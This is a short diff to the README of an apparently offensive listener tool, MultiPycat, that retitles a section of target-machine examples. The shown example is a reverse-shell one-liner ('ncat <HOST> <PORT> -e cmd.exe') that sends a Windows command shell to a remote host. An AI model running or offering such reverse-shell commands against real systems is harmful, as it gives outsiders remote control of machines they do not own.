@@ -20,7 +20,7 @@ python3 MultiPycat.py <LISTENING PORT>
 MultiPycat> help
 ```
 
-Target machine examples
+Target machine examples for testing
 ```
 # windows
 ncat <HOST> <PORT> -e cmd.exe
